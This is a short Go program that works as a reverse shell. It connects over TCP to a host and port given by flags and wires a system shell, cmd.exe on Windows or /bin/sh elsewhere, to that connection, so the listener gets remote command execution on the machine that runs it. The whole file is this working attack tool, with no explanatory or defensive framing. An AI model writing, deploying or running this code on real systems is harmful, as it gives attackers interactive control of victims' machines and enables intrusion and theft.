package main

import (
	"flag"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strconv"
)

func getSystemShell() *exec.Cmd {
	if runtime.GOOS == "windows" {
		return exec.Command("cmd.exe")
	} else {
		return exec.Command("/bin/sh", "-c", "/bin/sh")
	}
}

func main() {
	port := flag.Int("port", 8080, "server port")
	host := flag.String("host", "localhost", "sever address")
	versobese := flag.Bool("verbose", false, "verbosiyu")

	flag.Parse()

	listenerAddr := net.JoinHostPort(*host,strconv.Itoa(*port))

	if *versobese {
		fmt.Printf("Connection to listener: %s\n", listenerAddr)
	}

	conn, _ := net.Dial("tcp", listenerAddr)
	cmd := getSystemShell()
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
